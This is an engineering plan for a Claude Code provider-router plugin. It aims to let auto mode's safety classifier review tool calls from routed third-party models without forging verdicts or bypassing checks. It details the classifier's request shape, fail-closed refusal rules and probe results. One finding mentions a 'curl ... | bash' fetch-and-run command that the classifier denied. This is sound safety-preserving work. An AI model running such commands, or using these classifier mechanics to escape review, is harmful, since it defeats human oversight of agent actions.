# Auto mode for routed models: answer the engine's request in place

## Overview
- **Problem.** In auto mode (`--permission-mode auto`, or `permissions.defaultMode: "auto"`) Claude Code refuses every tool call of a routed model that no rule settles, most visibly `Agent`: `The server-side auto mode classifier gave no verdict for Agent: the request that produced this action did not ask for one`. A routed main session cannot start a subagent; a routed subagent cannot run a command outside the working directory.
- **Cause (observed live, Claude Code 2.1.325).** The router answers the engine's shadow request with an empty stub and then yields the provider's reply as its own `turn.step` chunks. A tool call that arrives as hook-made chunks has no engine-parsed response behind it, and the engine fails closed.
- **Proposed fix.** Answer the engine's shadow request *with the provider's reply* (as Anthropic SSE) inside the `http.fetch` hook, and let the engine's own chunks flow up through `turn.step`. In the probes the engine then logs `no server verdict for this call (server_no_result); the local classifier decides it` and judges the call with its own local classifier request, which the router must let through.
- **Benefit.** Auto mode works for routed main sessions and routed subagents, with Claude Code's real classifier deciding. No verdict is forged and no check is bypassed.
- **Status of the evidence.** The probes were run once, on throwaway copies, in `-p` mode. They are recorded in `docs/design-notes.md` under "Answer in place". They show the mechanism exists; they do not establish the security boundary, the delivery semantics or interactive behaviour. Task 2 repeats every probe with kept scripts and settles the open points before any production code depends on them. **If Task 2 cannot produce a bounded classifier predicate, the plan stops there.**
- **Task 2 result (2026-11-15), decision gate resolved (see User decisions below).** The spike is recorded in `docs/design-notes.md`, "Answer in place: spike". Classifier predicate, timeout mechanism and Esc: go. Two GO items were answered no as planned:
  - **Attribution.** The classifier request carries no agent header, so it cannot be tied to a loop. This plan is revised to a session-wide rule (no loop condition in the predicate; the opt-out refuses classifier requests of the whole session once any step was routed). Decision needed: accept that, or stop.
  - **Long hold.** The host ends any `$.http.fetch` after 30 s (`no complete answer within 30000ms`), from the `http.fetch` hook and from the `turn.step` hook alike, so `v0.1.2` has the same limit today. The hold itself works to just under the engine's 600 s request timeout. Decision needed: (A) ship answer in place with the 30 s provider limit documented as it stands; or (B) add a task that moves the provider call to `$.process.run(["curl", ...])` (works for 590 s in the spike; CLI only; the key must go through stdin or a config read from stdin, never argv); or stop.
- **User decisions (2026-11-15):** the session-wide classifier rule is accepted; for the long hold, option (B) is taken: provider calls go through a `curl` child process instead of `$.http.fetch`, so a reply may take up to the 570 s timeout instead of 30 s. That is the new Task 7; Tasks 8 to 13 follow it. `$.http.fetch` stays as the fallback when `curl` cannot be started, with the 30 s limit documented for that case.
- **Non-goals.** Streaming of routed replies; extended thinking; any hook that answers `tool.check` with `allow`.

## Context (from discovery)
- Repo `oleggohman/cc-provider-router`, `main` at `v0.1.2`. Working branch for this plan: `feat/answer-in-place` (new). The branch `auto-mode-limit-fable-limits` holds uncommitted work that Task 1 lands first: the `anthropic:claude-fable` limits row, the documented limitation and the probe records.
- Files involved: `hooks/register.ts` (`routedStep`, hook wiring), `hooks/shadow.ts` (capture, fail-closed rules, circuit breaker), `hooks/chunks.ts`, `hooks/errors.ts` (`errorChunks`), `hooks/thread.ts` (per-loop state, anchors), `hooks/context.ts` (usage for compaction), `hooks/call.ts` (timeout race), `hooks/route.ts` (`parseModel` accepts any suffix), both adapters, all `*.test.ts` beside them, `tests/harness.ts`, `scripts/smoke.sh`, `README.md`, `CLAUDE.md`, `docs/design-notes.md`.
- Observed in the probes (`docs/design-notes.md`, "Auto mode" and "Answer in place"; each is re-verified in Task 2):
  - the shadow request carries `safeguards: [{ type: "dangerous_tool_use", classifier_context: {...} }]`;
  - passing the shadow stream's `engine` chunks around hook-made chunks changes nothing;
  - answering the shadow request with an SSE body holding a `tool_use` block triggers the engine's local-classifier fallback "for the rest of this session";
  - the classifier request is an engine request of the same loop (model `claude-sonnet-5`, no `tools`, no `thread`), sent while the step's stream is still open; today's rule refuses it, and the engine then retries the classifier with the session's own prefixed model id;
  - with it let through (by a deliberately loose probe rule, not the rule this plan ships), `Agent` is judged and runs;
  - a nested `$.http.fetch` of 25 s inside the `http.fetch` hook completes; a plain `$.clock.sleep(25000)` there is cut at 10 s; the nested fetch does not pass through the mod's own `http.fetch` hook.
- Found in Task 2 and now binding (details and run records in `docs/design-notes.md`): the classifier request has no agent header and is marked by an `auto-mode-classifier-<date>` token in `anthropic-beta`; the engine sends side requests that bypass `turn.step` under the session's prefixed model id (prompt suggestion, its own compaction, the classifier's retry); an engine-parsed `refusal` or `model_context_window_exceeded` stop reason makes the engine act on its own (safety-stop notice, resume prompt); the step result's `answer` is trimmed and tool arguments are reordered; after Esc the engine still reads the answer the fetch hook returns; `$.http.fetch` ends at 30 s; the engine's request times out at 600 s.
- Plugin API facts this plan depends on (`.claude-plugin/types/claude-code/index.d.ts`): a nested operation skips its calling hook; `next.origin` names who raised a request, not what it is for, and a hook above may rewrite an engine request without changing the origin; `next.signal` aborts on Esc and also when an enclosing hook settles or a hook exhausts its budget; a `.catch` has a short grace after which the hook is absent; a `turn.step` result may complete with `stopReason: null`; chunks a failed streaming hook already yielded stay.
- Conventions that bind this work (`CLAUDE.md`): fail-closed shadow rules, thread-state invariants, no `$.session.authorize()`, no secrets, TDD, tests run sequentially.

## Development Approach
- **testing approach**: TDD (tests first), as `CLAUDE.md` requires
- complete each task fully before moving to the next; small, focused changes
- **CRITICAL: every task MUST include new/updated tests** for code changes in that task, success and error paths
- **CRITICAL: every task ends green**: `npm test`, `npm run typecheck`, `npm run validate`, in that order, never in parallel
- **CRITICAL: update this plan file when scope changes during implementation**
- Task 2 is a go/no-go spike. Its findings are written to `docs/design-notes.md`, this plan is revised from them, and the revised plan is reviewed again before Task 3 starts
- commit per task (Conventional Commits); merge, tag and publish only with the user's go-ahead

## Testing Strategy
- **unit tests**: `claude plugin test .`, one `*.test.ts` per module. `routedStep` and the fetch-side handler are tested directly with injected `fetch` / `sleep` / `signal` (the kit refuses `$.http.fetch` from a test's own hooks).
- **fail-closed tests**: every change to `hooks/shadow.ts` gets tests asserting zero network calls for anything that could be a shadow, a routed conversation, or a router-prefixed model id.
- **local end-to-end (new, free)**: `scripts/automode-check.sh` with a local mock provider and an **observer plugin** (`tests/observer-plugin/`): a second mod whose only hook is an `http.fetch` hook that appends one line per request it sees (URL, model, origin, body keys) to a file. Placed beneath the router in the hook chain (its `--plugin-dir` after the router's; Task 2), it records what actually left the router. Assertions are made on that record, not on `shadowLeaks` (which counts one guard's catches) and not on a debug-log string alone.
- **live smoke tests**: `scripts/smoke.sh`, assertions updated in Task 11 to what the new design reports.
- no UI e2e.

## Progress Tracking
- mark completed items with `[x]` immediately when done
- add newly discovered tasks with ➕ prefix; blockers with ⚠️ prefix
- keep the plan in sync with actual work done

## Solution Overview

### Today
```
turn.step hook (routed model)
  1. shadowStep: next({ ...e, model: SHADOW })  -> http.fetch hook captures the body, answers an empty stub
  2. resolveThread + buildRequest
  3. provider call ($.http.fetch from the turn.step hook, raced against $.clock.sleep;
     it passes through the mod's own http.fetch hook, whose last guard refuses shadow models and URLs)
  4. yield the reply as hook-made chunks; return a hook-made result
```

### After this plan ("answer in place")
```
turn.step hook (routed model)
  1. check key / endpoint (unchanged: no engine work for a step that cannot be answered)
  2. register a job for the loop (route, config, event, signal, a fresh job id)
  3. drive the engine's stream: for await (chunk of next({ ...e, model: SHADOW })) yield chunk
     in a try/finally that always ends the job
  4. after the stream: decide delivery from the job's phase and the engine's result,
     then commit or drop the loop's thread state

http.fetch hook, engine's shadow request of that loop
  a. strict match as today (engine request, SHADOW model, loop key, message count)
  b. resolveThread + normalizeBody + buildRequest; keep the step's system prompt and
     effective tools on the loop at once, withhold the conversation and anchors
  c. outbound guard, then the provider call (nested $.http.fetch), with the timeout mechanism Task 2 selects
  d. answer the engine's request with the reply as Anthropic SSE; for an error reply, a timeout or
     an aborted signal (Esc) answer the empty stub instead (the turn.step hook then yields today's
     hook-made error chunks, or nothing after Esc)
  e. any failure: a local answer, never next(e) for a shadow

http.fetch hook, every engine request (pending job or not), in this order
  1. names the shadow model, in its body or URL          -> existing rules (answer the one match, refuse the rest)
  2. names a router-prefixed or malformed-prefix model   -> refuse (new)
  3. matches the classifier predicate                    -> pass if autoModeClassifier is on (new). With it off:
     refuse once any step was routed since the module loaded, or while no step was seen at all
  4. another engine request of a loop with a pending job -> refuse (unchanged)
  5. anything else                                       -> next(e) (unchanged)
```

### Key decisions
- **The shadow request still never leaves the machine.** It is answered locally, now with real content. `SHADOW_MODEL` stays a non-existent id.
- **Outbound guard replaces hook re-entry.** Today the provider call passes through the mod's own `http.fetch` hook, whose last guard refuses a request naming the shadow model in its body or URL. A nested fetch skips that hook, and `parseModel` accepts any suffix (`custom:gw:provider-router-shadow`). So the handler validates before sending: the routed model is not `SHADOW_MODEL`, the target URL does not contain it. A conversation that merely quotes the name is still sent (as today).
- **Classifier exception: a bounded predicate or no feature.** Unconditional refusals (shadow model, shadow URL, prefixed model) run first. The exception needs all of: host-set engine origin; `POST` to exactly `https://api.anthropic.com/v1/messages?beta=true`; the `auto-mode-classifier-<date>` token in `anthropic-beta` (Task 2: no other recorded request carries it); no agent header; a body whose top-level keys are all in the classifier's allowlist and whose `model` is a non-empty string that is not the shadow model and has no router prefix (`classifyModel(...).kind === 'unprefixed'`; a syntactic check, not model validation). Task 2 tried it against about 400 recorded engine requests and synthetic variants: only classifier requests match. There is no loop condition (next point but one).
- **What the predicate proves, and what it does not.** The marker distinguishes the engine's classifier traffic from the engine's other observed traffic; it is not payload isolation and not model validation. `classifyModel(...).kind === 'unprefixed'` accepts any string without a router prefix, and `messages`, `system` and `metadata` are unrestricted. `next.origin` does not prove a request is unmodified: a hook above the router may rewrite an engine request and could carry arbitrary content in the allowed fields to the first-party host. This residual is accepted with the session-wide rule and documented in `CLAUDE.md` and the README; the `autoModeClassifier: false` opt-out removes it.
- **`.catch` never grants the exception and never evaluates the predicate.** In `shadowFetchFailed`, a request not yet forwarded (`next.called` false) is refused when a job is pending, or it names the shadow model or a prefixed id, or (with `autoModeClassifier: false`) it is an engine request while `routedSeen` is true or `stepSeen` is false (see the next points), job or no job. Replay stays only for a request already forwarded.
- **The exception is session-wide, not per loop (Task 2).** The classifier request is sent before the step's stream ends for the first judged call of a reply and after it for every other call, and it never carries the agent header: a subagent's call is judged by a request that looks like the main loop's. So nothing ties it to a loop, and the engine classifies locally for the whole session after the first routed step anyway. The module keeps two flags since it loaded: `routedSeen` (some step was routed) and `stepSeen` (some step was seen). They matter only under the opt-out.
- **A reload must not open the opt-out.** A `/config` change reloads the module and clears both flags, possibly while a classifier request or its retry is outstanding, and possibly switching `autoModeClassifier` to `false`. So with `autoModeClassifier: false` a classifier request is refused while `stepSeen` is false, as it is once `routedSeen` is true. The cost, stated in the README: right after a reload with the opt-out set, a classifier request can be refused once, until the next step. Task 2 could not trigger a reload without writing the user's settings (`/config`), so this rule rests on unit tests and on the manual check in Post-Completion.
- **The subscription pays for classifier requests in auto mode, and they carry the session's prompts and tool calls** (routed loops included) to the first-party API. This is Claude Code's behaviour behind any gateway, but new for this plugin. It is documented, with an opt-out: plugin option `autoModeClassifier` (boolean, default `true`). When `false`, the session's classifier requests are refused once any step was routed, and auto mode fails closed as it does today (the engine first retries the classifier under the session's prefixed model id, which rule 2 refuses).
- **Prefixed model ids never reach the first-party host, pending job or not (Task 2).** The engine sends requests of its own that bypass `turn.step` under the session's model id: a prompt suggestion and its own compaction (both carry the conversation), and the classifier's retry. Rule 2 refuses them all.
- **Zero usage in the SSE answer, the provider's model name.** With real usage the engine prices the shadow model at invented rates in `/cost` and starts its own compaction at an assumed 1M window, through a request that bypasses `turn.step` (Task 2). So the answer reports zero usage (cost stays $0 as today), the mod keeps its own usage record and compaction scheduling, and only the model name is the provider's (the transcript then names the real model).
- **Session-wide side effect, documented.** After the first routed step in auto mode the engine classifies locally "for the rest of this session", including later steps on subscription models.
- **Delivery is a state machine, not "the stream ended".** See Technical Details. A step is recorded only when the provider answered, the router handed the engine that answer, and the engine's result for the step reflects it. Anything ambiguous drops the conversation.
- **System prompt and effective tools are kept before delivery can go wrong**, as `deliver` does today (`recordStep` then `dropBase`): an interrupted step must not lose tool additions and removals, which the session history cannot give back.
- **Jobs have identity.** A late provider answer, a timer, or a cleanup of an abandoned dispatch acts only on the job whose id it holds, never on a newer job of the same loop.
- **Errors stay text replies** prefixed `[provider-router]`, delivered as today: no SSE stop reason works (`end_turn` hides the text from a parent agent and costs three more calls, `refusal` and `model_context_window_exceeded` make the engine act on its own, an HTTP 400 cannot be recorded). The fetch-side handler answers the shadow request with the empty stub and the `turn.step` hook, which has yielded nothing yet, drains the stub's chunks and yields `errorChunks` (hook-made, `refusal`).
- **Esc: answer the empty stub at once.** Both hooks' signals abort together and the engine still reads whatever the fetch hook returns; text handed then is recorded by the engine. The stub leaves nothing shown and nothing recorded, and the next request of the loop is a fresh `thread: create`.
- **The router's timeout stays below the engine's.** The engine's request times out at 600 s (the fetch hook's signal aborts). `DEFAULT_TIMEOUT_MS` becomes 570 s. With the `curl` transport (Task 7) the timer decides; on the `$.http.fetch` fallback the host's 30 s limit decides first.
- **Rejected alternatives.** (1) A `tool.check` hook answering `allow`: runs a third-party model's calls unreviewed while the session says auto mode. (2) Passing the shadow's `engine` chunks around hook-made chunks: tested, no effect. (3) Document the limit only: lands in Task 1 as the interim state.

## Technical Details

### Job
```ts
type JobPhase =
  | 'registered'   // turn.step hook registered it, no engine request seen
  | 'captured'     // the shadow request matched; system/tools kept on the loop
  | 'answered'     // provider replied (or failed); outcome staged
  | 'handed'       // the SSE answer was returned to the engine
  | 'abandoned'    // timeout, Esc, hook budget, or dispatch abandonment

type Job = {
  id: number                      // unique per job; every async continuation checks it
  messageCount: number
  route: Route; config: Config; event: StepEvent; signal: AbortSignal
  phase: JobPhase
  sent?: any; anchors?: Anchors   // set at capture, before the provider call
  outcome?:
    | { kind: 'reply'; assistant: any[]; usage: Usage; messageId: string; stopReason: StopReason }
    | { kind: 'error'; error: ErrorReply }        // the stub was answered; the step hook yields errorChunks
    | { kind: 'cancelled' }                       // the signal aborted; the stub was answered
}
```
- Module-level `Map<loopKey, Job>`, one job per loop. A job is removed by whichever comes first, each checking the job id: the `turn.step` hook's `finally` (success, error, iterator closed with `.return()`), or an `abort` listener on the dispatch's `next.signal` (Esc, the enclosing hook settling, budget exhaustion, the dispatch abandoned). Task 2: a consumer that leaves its loop aborts the signal and closes the generator (`finally` runs); the hook's own budget running out aborts the signal and runs no `finally` (the job stayed and the next step found it pending), so the listener is the only cleanup for that case. A consumer that merely hangs is cut by the host and the stream is read on. Listeners and timers are removed when the job settles.
- A reload empties it; a stray shadow request is then refused by the no-entry rule (unchanged).

### Delivery decision (in the `turn.step` hook, after the stream)
| Job phase and outcome | Engine result | Signal | Action |
|---|---|---|---|
| `handed`, `reply` | `stopReason` equal; `answer` equal to the staged text **trimmed**; every tool use's name equal and its arguments deep-equal **whatever the key order** | not aborted | record the step (conversation, anchors, the minted message id bound as an anchor) |
| `handed`, `error` | the stub drained, `errorChunks` yielded and read to the end | not aborted | record the error text as the assistant turn (today's invariant) |
| `handed`, `reply` | `stopReason` null, or any of those differ | any | drop the conversation (system and tools stay) |
| `handed`, `cancelled` | any (Task 2: `stopReason` null) | aborted | record nothing; the conversation is dropped (the engine's next request is a `thread: create`) |
| `answered`, `captured` | any | any | drop the conversation |
| `registered` | any | not aborted | drop the conversation; circuit-breaker rule as today |
| any | any | aborted before `handed` | record nothing (Esc before delivery) |
| any | iterator closed or abandoned mid-stream | any | drop the conversation |

Task 2 checked the correspondence: the result's `answer` is the SSE text trimmed, `toolUses[].input` holds the same values with keys reordered, and two replies with the same stop reason and counts but different content give different results. A cut or malformed body gives `stopReason: null` (the engine also sends the request again, which rule 1 refuses). One case the result does not reveal: a body complete but for `message_delta` and `message_stop` looks delivered while the engine reports a lost connection; `toSse` always writes both events and a test pins that. There is no weaker fallback: a mismatch drops the conversation and the next continue is rebuilt from the session history.

### Reply → Anthropic SSE (`hooks/sse.ts`, new)
- `toSse(reply: Reply, id: string): string`: `message_start` (id, the reply's `model`, zero usage), per block `content_block_start` / one delta (`text_delta`, or `input_json_delta` with the whole arguments JSON) / `content_block_stop`, `message_delta` (`stop_reason`, `usage.output_tokens: 0`), `message_stop`. Only stop reasons the engine takes as an ordinary end are written: `end_turn`, `tool_use`, `max_tokens`, `stop_sequence`; a reply with any other (`refusal`, `model_context_window_exceeded`, `pause_turn`, `compaction`) goes the error path, since the engine acts on those itself.
- Empty text blocks dropped; indexes count the blocks sent, from 0 (same rule as `toChunks`).
- `stubSse()` (moved from `shadow.ts`): the empty answer, used for an error outcome and after Esc.
- No `errorSse`: errors are hook-made chunks (Key decisions).
- Message ids are minted by the router, unique per reply (`msg_pr_<load id>_<n>`). Task 2: the next continue's `previous_message_id` equals that id, so a recorded reply's anchor is bound when it is recorded. After a hook-made error step the continue names an engine-made `msg_hook_*` id, learned from the continue as today.

### Classifier predicate (pinned by Task 2)
```
evaluated only after the unconditional refusals (shadow model, shadow URL, prefixed or malformed model id)
next.origin.plugin === 'engine'
AND (e.init.method ?? 'GET') === 'POST'
AND e.url === 'https://api.anthropic.com/v1/messages?beta=true'
AND one comma-separated token of the anthropic-beta header matches /^auto-mode-classifier-\d{4}-\d{2}-\d{2}$/
AND the request has no x-claude-code-agent-id header
AND e.init.body is a string that parses to a JSON object (not an array)
AND typeof body.model === 'string', not empty, not SHADOW_MODEL, classifyModel(body.model).kind === 'unprefixed'
AND every top-level key of body is one of: max_tokens, messages, metadata, model, stop_sequences, system, thinking
```
An unparseable or unreadable body never matches. No loop condition. A match passes when `autoModeClassifier` is on; with it off it is refused when `routedSeen` or not `stepSeen`, else treated as an ordinary request. Behind `ANTHROPIC_BASE_URL` the predicate never matches (other URL, and no classifier beta there): a classifier request sent while a job is pending is refused and that call fails closed; stated in the README.

### Timeout, Esc and abandonment inside the `http.fetch` hook
- **Mechanism (a), proven in Task 2:** `raceCall` in the fetch-side handler, with the fetch hook's own `$.clock.sleep` and `next.signal`. A sleep racing an in-flight nested fetch is not cut at 10 s (15 s limit against a 25 s provider: timeout reply at 15005 ms, the next step works). (b) works too and is not used: one place owns the call, the timer and the signal.
- `DEFAULT_TIMEOUT_MS` is 570 s, below the engine's 600 s. Provider calls use the `curl` transport (Task 7), which is not subject to the host's 30 s `$.http.fetch` limit. On the `$.http.fetch` fallback the host still ends a call at 30 s whatever the timer says; that failure is an ordinary `failed` outcome with the host's text (`no complete answer within 30000ms`), which the error reply turns into a clear sentence naming the fallback.
- Esc: the handler's `next.signal` aborts (so does the step hook's), the in-flight fetch rejects with `The operation was aborted`, `raceCall` returns `cancelled`, the handler answers the stub at once.
- Cases the handler and the hook must each handle, by job id: fetch-hook budget exhaustion; the `turn.step` dispatch abandoned while the fetch-side handler lingers; timeout followed by a new step on the same loop; a late provider success or rejection after abandonment (a rejection that nobody awaits is logged by the host: attach a handler). In every case the late result is discarded and the newer job is untouched.
- A provider call already sent may still be billed.

### Usage and compaction
- The SSE answer reports zero usage. The handler stores the reply's real usage on the job; the `turn.step` hook calls `recordUsage` with it after a recorded step (the engine's result carries the zeros).
- `context.ts` stays as it is: the mod's own `$.session.compact()` scheduling after `turn.complete`. Task 2: with zero usage the engine never starts its own compaction; with real usage it would, at an assumed 1M window and through a request that names the prefixed model and bypasses `turn.step`.
- Not probed in Task 2 (no way without a person): recovery after an engine compaction fork, and after `/model` to a subscription model and back. They stay with today's rules (`forkedLoop`, `onUnprefixedStep`) and the manual checks.

## What Goes Where
- **Implementation Steps** (`[ ]` checkboxes): code, tests, scripts and docs in this repo.
- **Post-Completion** (no checkboxes): interactive checks only a person can do, release.

## Implementation Steps

### Task 1: Land the interim state (Fable limits, documented limitation, probe records)

**Files:**
- Modify: `hooks/limits.ts`, `hooks/limits.test.ts`, `README.md`, `docs/design-notes.md` (already edited on `auto-mode-limit-fable-limits`, uncommitted)
- Create: `docs/plans/20261115-auto-mode-answer-in-place.md` (this file)

- [x] review the uncommitted diff on `auto-mode-limit-fable-limits`
- [x] confirm the tests for the limits row are present (`maxOutputTokens('anthropic:claude-fable-5-2')`, `windowFor('anthropic:claude-fable-5-2')`)
- [x] run `npm test`, `npm run typecheck`, `npm run validate` - must pass
- [x] commit as three commits: `fix(limits): add anthropic:claude-fable limits`; `docs: auto mode cannot review a routed model's tool calls`; `docs: answer-in-place probes and plan`
- [x] create `feat/answer-in-place` from that state

### Task 2: Go/no-go spike with kept probe scripts

**Files:**
- Create: `scripts/probes/mock-provider.py`, `scripts/probes/mock-gateway.py`, `scripts/probes/drive-pty.py`, `scripts/probes/make-probe.sh`, `scripts/probes/probe-mod/probe.ts`, `scripts/probes/run-probe.sh`, `scripts/probes/run-pty.sh`, `scripts/probes/make-abandoner.sh`, `scripts/probes/summary.sh`, `scripts/probes/check-predicate.py`, `scripts/probes/README.md` (how to run each probe and what result is expected; the probe mods themselves are generated into a temp dir, never committed as plugin code). These stay in the repo: they are how the engine facts are re-checked after a Claude Code release
- Create: `tests/observer-plugin/.claude-plugin/plugin.json`, `tests/observer-plugin/hooks/hooks.json`, `tests/observer-plugin/hooks/register.ts`, `tests/observer-plugin/README.md`
- Modify: `docs/design-notes.md` (findings), this plan (revise Tasks 3–13)

Each item is answered live and recorded as a row in `docs/design-notes.md` with the engine version, the sanitized request shape, the hook order and the outcome. A "no" on a **GO** item stops the plan for a decision by the user.

- [x] reproduce every row of "Answer in place" with the kept scripts, in `-p` and in a pty-driven interactive session — done: every row reproduced in `-p`; interactively the `Agent` and Bash flow with the classifier, plus the session-title side request
- [x] observer plugin: establish which load order puts its `http.fetch` hook beneath the router's, and confirm it sees the router's nested provider fetch and every request the router passes with `next(e)` — done: `--plugin-dir <router>` before `--plugin-dir <observer>` puts it beneath; it sees both
- [x] **GO: classifier predicate.** Capture the classifier request (URL, method, all headers, body keys, `metadata`) for a main loop and a subagent loop, in `-p` and interactively, for first and later tool calls and for the engine's retry. Produce the explicit predicate and a list of counterexamples tried against it: a thread create, a thread continue, a compaction request, a title or summary side request, a fallback-model retry of the conversation, a request to a non-Messages path. No-go if the only distinguishing marker is the system-prompt opening, or if any counterexample matches — GO: the marker is the `auto-mode-classifier-<date>` token of `anthropic-beta`; no counterexample matched (about 400 recorded requests and synthetic variants). The fallback-model retry was seen only behind the mock gateway
- [x] **GO: classifier timing and attribution.** Record the order of: the step's stream ending, the job's removal, `tool.check`, the classifier send, its retries; for several tool calls in one reply, for a later turn, and for a resumed subagent. Confirm the classifier request carries the loop's agent header. Decide whether the per-loop status is sufficient to attribute it — no-go as planned: order recorded (first judged call: sent while the job is pending; every other call: after the stream ended), but the request carries no agent header, so it cannot be attributed and the per-loop status is not sufficient. Revised to a session-wide rule, pending the user's decision
- [x] **GO: long hold.** A nested fetch of 300 s and of 600 s inside the `http.fetch` hook completes and the engine accepts the answer; record any engine request timeout — no-go as planned: the host ends any `$.http.fetch` at 30 s (from the `turn.step` hook of unpatched HEAD too). The hold itself is accepted at 319 s (chained 29 s fetches) and at 300 s and 590 s (`$.process.run` curl); the engine's request times out at 600 s. Pending the user's decision (A or B in the Overview)
- [x] **GO: timeout mechanism.** Prove (a) or (b) of "Timeout, Esc and abandonment" end to end: a 15 s limit against a 25 s provider yields the timeout reply, and the next step on the loop works — GO: both proven; (a) chosen
- [x] reload: a `/config` change (also one that sets `autoModeClassifier` to `false`) between the reply being handed over and the classifier send or retry: what the freshly loaded module sees, and that the `unknown`-status rule refuses it under the opt-out — inconclusive: a reload needs `/config`, which writes the user's settings (not allowed in the spike); editing the `--settings` file or project settings mid-session does not reload. Only a fresh session with the opt-out was run (classifier refused, auto mode fails closed)
- [x] abandonment: what the host does when the consumer stops reading the `turn.step` stream (is `.return()` called, does `next.signal` abort), so the listener-based cleanup is proven — done: a consumer leaving its loop aborts the signal and closes the generator; a hanging consumer is cut by the host and the stream read on; the hook's own budget running out aborts the signal with no `finally`, so the listener is needed
- [x] **GO: Esc.** Interactive Esc during the held request: what the `http.fetch` hook and the `turn.step` hook each observe (signal, iterator closed, hook abandoned), what the engine records, and that the next step works — GO: both signals abort together, the stream ends normally with `stopReason: null`; with the empty stub answered the engine records nothing and the next prompt (a fresh `thread: create`) works; text answered after Esc is recorded by the engine, so it is never sent
- [x] nested dispatch: confirm the provider fetch made from the `http.fetch` hook does not re-enter the router's hook, and that the observer still sees it — done: confirmed (`skipped: re-entry`; the observer records it in both load orders)
- [x] delivery: what the hook reads as the `turn.step` result (`answer`, `toolUses`, `stopReason`, `usage`) for a good reply; for two replies with the same stop reason and counts but different text and arguments; for a truncated SSE body; for malformed SSE; for an SSE answer the engine rejects; whether a `stopReason: null` result can follow a handed answer; whether `answer` and `toolUses` match the SSE content exactly (whitespace, key order of arguments) — done: `answer` is trimmed, argument keys are reordered, values equal; cut, malformed, empty and rejected bodies give `stopReason: null` after a handed answer; a body missing only its last two events looks delivered
- [x] error replies: which `stop_reason` in the SSE answer shows the `[provider-router]` text to the person and to a parent agent with no engine retry and no API-refusal report (`end_turn`, `refusal`, `model_context_window_exceeded`); also an HTTP 4xx with `x-should-retry: false`, and why it is or is not usable — done: none is usable (`end_turn` hides the text from a parent and costs three more calls; `refusal` and `model_context_window_exceeded` make the engine act on its own; a 400 is `hook_denied` with nothing to record). Chosen: empty stub plus today's hook-made error chunks
- [x] model and usage: with real usage and the provider's model name in the SSE, what `/cost`, `modelUsage`, transcript entries and `$.session.usage()` show; the same with zero usage and `SHADOW_MODEL`; choose one — done: real usage is priced under `provider-router-shadow` at invented rates and feeds `$.session.usage()`; the transcript takes the SSE's model name. Chosen: zero usage, the provider's model name
- [x] compaction: with real usage reported, does the engine compact a long routed session by itself, at what size, and how that interacts with the mod's `$.session.compact()`; recovery after an engine compaction fork and after `/model` to a subscription model and back — partly: with real usage the engine compacts by itself at an assumed 1M window through a request that bypasses `turn.step` under the prefixed model id (refused); with zero usage it never starts. Inconclusive: the interaction with `$.session.compact()`, a compaction fork, `/model` there and back (not probed)
- [x] thread anchors: after an SSE answer with a minted id, the `previous_message_id` of the next continue — done: it equals the minted id; after a hook-made error step it is an engine-made `msg_hook_*` id
- [x] classifier denial: a tool call the classifier blocks is not executed and the model gets the engine's own denial text — done: `curl ... | bash` against the mock was denied in stage 2 (`Reason: [Code from External]`), nothing ran
- [x] non-auto modes: default and accept-edits behave as in `v0.1.2` (no classifier request; prompts and rules work) — done in `-p`: the same results as unpatched HEAD, no classifier request; interactive prompts not exercised
- [x] write the findings into `docs/design-notes.md`; revise Technical Details and Tasks 3–13; send the revised plan for review; stop if any GO item failed (review sent by the orchestrator) — two GO items failed as planned (attribution, long hold): stopped for the user's decision

### Task 3: Reply → Anthropic SSE module


**Files:**
- Create: `hooks/sse.ts`, `hooks/sse.test.ts`

- [x] write tests for `toSse`: text only; tool call only; text and two tool calls; empty text block dropped; indexes from 0; `stop_reason` carried; usage always zero and the reply's model name in `message_start`; arguments JSON round-trips (nested objects, unicode, empty object); the body always ends with `message_delta` and `message_stop`
- [x] write tests for the stop-reason gate: `end_turn`, `tool_use`, `max_tokens`, `stop_sequence` are written; a reply stopping with `refusal`, `model_context_window_exceeded`, `pause_turn` or `compaction` is reported as not answerable in place (the caller takes the error path)
- [x] write tests for `stubSse` (moved from `shadow.ts`, unchanged output) and for `sameDelivery(result, staged)`: `answer` compared trimmed, tool arguments compared whatever the key order, a different value or name or stop reason is a mismatch
- [x] write a test that every emitted event parses as `event:` / `data:` JSON and that ids from two calls differ
- [x] implement `toSse`, the stop-reason gate, `stubSse`, `sameDelivery` and the id minting in `hooks/sse.ts`
- [x] run tests, typecheck, validate - must pass before Task 4

### Task 4: Jobs in `shadow.ts`, behind today's `shadowStep`

**Files:**
- Modify: `hooks/shadow.ts`, `hooks/shadow.test.ts`

`shadowStep` stays, as a wrapper over the new job functions that registers a job with no handler (so the stub is answered and the body returned, exactly as today). `register.ts` is untouched and the suite stays green.

- [x] write tests for `beginShadow(key, job)` / `endShadow(key, id)`: one job per loop; a second begin for a pending loop is refused; `endShadow` with a stale id does nothing
- [x] write tests: a matching shadow request with a job that has a handler calls it once and returns its answer; the handler throwing or rejecting gives a local error answer, never `next`; zero network calls for the shadow request in each case
- [x] write tests that today's fail-closed cases hold unchanged through the wrapper: no job → refused; unparseable body while pending → refused; non-engine request naming the shadow model → refused and counted; `shadowFetchFailed` refuses while anything is pending
- [x] write tests for the circuit breaker with jobs: a job that ends in phase `registered`, without Esc, with no engine request seen sets `blind`; an engine request clears it
- [x] implement `Job`, `JobPhase`, `beginShadow`, `endShadow`, the handler call in `shadowFetch`, and `shadowStep` as the wrapper
- [x] run tests, typecheck, validate - must pass before Task 5

### Task 5: Unconditional refusals and the classifier exception

**Files:**
- Modify: `hooks/shadow.ts`, `hooks/shadow.test.ts`, `hooks/config.ts`, `hooks/config.test.ts`, `.claude-plugin/plugin.json`, `hooks/register.ts`, `hooks/register.test.ts`

- [x] write tests for the new unconditional rule, each refused with zero network calls, with and without a pending job: an engine request naming a router-prefixed model (`custom:x:y`, `anthropic:...`, `zai:...`, `openai:...`); a malformed prefix (`openai:`, `custom:gw`); a prefixed id in the URL; an unreadable body while any job is pending
- [x] write tests for the predicate from Task 2, from the recorded shapes (stage 1, stage 2): a classifier request reaches `next` exactly once, with a job pending on the main loop, with a job pending on a subagent loop, and with none; with `autoModeClassifier: false` and `routedSeen` it is refused
- [x] write negative tests, each refused with zero network calls while a job is pending: the classifier marker with a shadow URL; with another host or path (`count_tokens`); with `GET`; with `tools`; with `thread` (create and continue); with `stream`, `safeguards`, `output_config` or any key outside the allowlist; with an agent header; with a non-engine origin; the beta only as a substring of another token; an ordinary conversation request rewritten to a real model id; a retry of the conversation with a real model id and no marker; the recorded session-title request
